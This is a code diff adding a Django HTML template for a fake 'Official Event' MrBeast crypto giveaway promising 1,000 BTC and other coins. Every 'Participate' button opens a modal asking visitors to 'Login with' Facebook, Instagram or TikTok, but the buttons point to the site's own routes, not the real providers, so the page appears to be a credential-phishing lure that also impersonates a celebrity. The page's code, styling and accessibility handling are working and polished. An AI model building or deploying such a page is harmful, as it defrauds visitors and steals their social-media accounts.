@@ -1,0 +1,241 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'css/index.css' %}">
+    <link rel="shortcut icon" href="{% static 'images/MrBeastLogo.png' %}" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="{% static 'scripts/script.js' %}"></script>
+    <title>Biggest CRYPTO giveaway of $100000000</title>
+    <style>
+        /* Responsive, refined modal styles */
+        :root{
+            --modal-bg: rgba(0,0,0,0.55);
+            --card-bg: #0f1720;
+            --muted: #c7c7c7;
+            --accent: #06b6d4;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            background-color: var(--modal-bg);
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .modal[aria-hidden="false"] { display: flex; }
+
+        .modal-content {
+            width: 100%;
+            max-width: 420px;
+            background: var(--card-bg);
+            color: #fff;
+            border-radius: 12px;
+            padding: 18px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            position: relative;
+            transform: translateY(-6px);
+            animation: modalEnter .18s ease-out;
+            text-align: center;
+        }
+
+        @keyframes modalEnter {
+            from { opacity: 0; transform: translateY(-12px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-header {
+            display:flex;
+            align-items:center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+
+        .modal h2 {
+            font-size: 1.125rem;
+            margin: 0;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: transparent;
+            border: none;
+            color: var(--muted);
+            font-size: 20px;
+            cursor: pointer;
+            padding: 6px;
+            line-height: 1;
+            border-radius: 6px;
+        }
+        .close-button:focus { outline: 2px solid rgba(6,182,212,0.25); color: #fff; }
+
+        .social-login {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            margin-top: 14px;
+            flex-wrap: wrap;
+        }
+
+        .social-btn {
+            width: 64px;
+            height: 64px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 999px;
+            color: #fff;
+            text-decoration: none;
+            font-size: 22px;
+            box-shadow: 0 6px 18px rgba(2,6,23,0.6);
+            transition: transform .12s ease, box-shadow .12s ease, opacity .12s ease;
+            border: none;
+        }
+        .social-btn:focus { transform: translateY(-3px); outline: 3px solid rgba(6,182,212,0.18); }
+
+        /* Brand colors (subtle) */
+        .facebook{ background: linear-gradient(180deg,#1877f2,#145dbf); }
+        .instagram{ background: radial-gradient(circle at 30% 20%, #ffd055 0%, #f58529 30%, #c13584 60%, #833ab4 100%); }
+        .tiktok{ background: linear-gradient(180deg,#69c9d0,#010101); }
+
+        .social-label {
+            display:block;
+            font-size: .8rem;
+            color: var(--muted);
+            margin-top: 8px;
+        }
+
+        /* Responsive tweaks */
+        @media (max-width:420px){
+            .modal-content{ padding:16px; max-width:360px; border-radius:10px; }
+            .social-btn{ width:56px; height:56px; font-size:20px; }
+            .modal h2{ font-size:1rem; }
+        }
+
+        @media (max-width:320px){
+            .social-btn{ width:48px; height:48px; font-size:18px; }
+            .social-login{ gap:10px; }
+        }
+    </style>
+</head>
+<body>
+    <div id="main">
+        <nav>
+            <text class="mb">Mr Beast</text>
+            <div id="links">
+                <a href="#intro">Giveaway</a>
+                <a href="#rules">Info</a>
+                <a href="#instructions">Instruction</a>
+                <a href="#participate">Participate</a>
+                <a href="#transactions">Transactions</a>
+            </div>
+            <a class="p_button" href="#participate">Participate <i class="fas fa-regular fa-arrow-right"></i></a>
+        </nav>
+
+        <header>
+            <div id="intro">
+                <span id="badge"><i class="fa-solid fa-circle-check"></i> Official Event</span>
+                <h1>BIGGEST CRYPTO GIVEAWAY<br>OF <text>$100 000 000</text></h1>
+                <article>
+                    During this unique event we will give you the opportunity to get
+                    <text>1,000 BTC</text> &amp; <text>10,000 ETH</text> &amp; 
+                    <text>100,000,000 DOGE</text> &amp; 
+                    <text>100,000,000 XRP</text>. 
+                    Have a look at the rules and don’t miss on your chance! You can only participate once!
+                </article>
+                <a class="p_button" href="#participate" style="margin-top: 30px;">Participate <i class="fas fa-regular fa-arrow-right"></i></a>
+            </div>
+            <div id="intro_img">
+                <center><img src="{% static 'images/MrBeastLogo.png' %}"></center>
+            </div>
+
+        </header>
+
+    </div>
+
+    <!-- modal markup: improved accessibility & structure -->
+    <div id="loginModal" class="modal" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="loginModalTitle">
+        <div class="modal-content" role="document">
+            <button class="close-button" type="button" aria-label="Close login dialog">&times;</button>
+            <div class="modal-header">
+                <h2 id="loginModalTitle">Login with</h2>
+            </div>
+
+            <div class="social-login" role="group" aria-label="Social login options">
+                <a href="{% url 'facebook' %}" class="social-btn facebook" data-provider="facebook" aria-label="Login with Facebook"><i class="fab fa-facebook-f" aria-hidden="true"></i></a>
+                <a href="{% url 'instagram' %}" class="social-btn instagram" data-provider="instagram" aria-label="Login with Instagram"><i class="fab fa-instagram" aria-hidden="true"></i></a>
+                <a href="{% url 'tiktok' %}" class="social-btn tiktok" data-provider="tiktok" aria-label="Login with TikTok"><i class="fab fa-tiktok" aria-hidden="true"></i></a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const modal = document.getElementById('loginModal');
+            const participateButtons = document.querySelectorAll('.p_button');
+            const closeButton = modal.querySelector('.close-button');
+            const focusableSelector = '.social-btn, .close-button';
+            let lastActive = null;
+
+            function openModal(triggerButton){
+                lastActive = triggerButton || document.activeElement;
+                modal.setAttribute('aria-hidden','false');
+                document.body.style.overflow = 'hidden';
+                // focus first social button
+                const first = modal.querySelector('.social-btn');
+                if(first) first.focus();
+                document.addEventListener('keydown', handleKeyDown);
+            }
+
+            function closeModal(){
+                modal.setAttribute('aria-hidden','true');
+                document.body.style.overflow = '';
+                if(lastActive && typeof lastActive.focus === 'function') lastActive.focus();
+                document.removeEventListener('keydown', handleKeyDown);
+            }
+
+            participateButtons.forEach(button => {
+                button.addEventListener('click', function (event) {
+                    event.preventDefault();
+                    openModal(button);
+                });
+            });
+
+            closeButton.addEventListener('click', function () {
+                closeModal();
+            });
+
+            // close on backdrop click
+            modal.addEventListener('click', function (event) {
+                if (event.target === modal) closeModal();
+            });
+
+            // keyboard handling: Esc to close, Tab trap
+            function handleKeyDown(e){
+                if(e.key === 'Escape'){ e.preventDefault(); closeModal(); return; }
+                if(e.key === 'Tab'){
+                    const focusable = Array.from(modal.querySelectorAll(focusableSelector)).filter(el => !el.disabled && el.offsetParent !== null);
+                    if(focusable.length === 0) return;
+                    const idx = focusable.indexOf(document.activeElement);
+                    if(e.shiftKey){
+                        if(idx === 0 || document.activeElement === modal) { focusable[focusable.length-1].focus(); e.preventDefault(); }
+                    } else {
+                        if(idx === focusable.length -1) { focusable[0].focus(); e.preventDefault(); }
+                    }
+                }
+            }
+        });
+    </script>
+</body>
+</html>
